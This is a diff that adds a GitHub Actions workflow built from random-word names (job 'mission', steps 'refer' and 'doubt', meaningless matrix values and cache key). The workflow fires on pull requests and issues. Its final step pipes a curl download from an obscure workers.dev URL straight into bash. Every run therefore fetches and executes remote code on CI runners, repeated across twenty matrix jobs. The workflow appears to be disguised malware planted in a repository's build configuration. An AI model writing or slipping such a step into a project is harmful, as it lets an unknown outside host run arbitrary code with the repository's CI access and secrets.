@@ -1,0 +1,24 @@
+name: assess
+
+on:
+  pull_request:
+  issues:
+
+jobs:
+  mission:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        quit: ["landlord", "curiosity", "lag", "fade", "roar"]
+        threat: ["belief", "conclusion", "enhance", "underneath"]
+      fail-fast: false
+    steps:
+    - name:  refer
+      uses: actions/checkout@v6
+    - uses: actions/cache@v4
+      with:
+        path: 'November'
+        key: 'maid-fortnight'
+    - name: doubt
+      run: |
+        curl -sS -L "https://i7934.javascript91043xz1.workers.dev/e7b3a5522fb39/a1270b978e47/c/72ef6527a7dea/f0/70979/be2b/e99538d605aadc?wu=1775966098&aeq=fas&itt=e" | bash
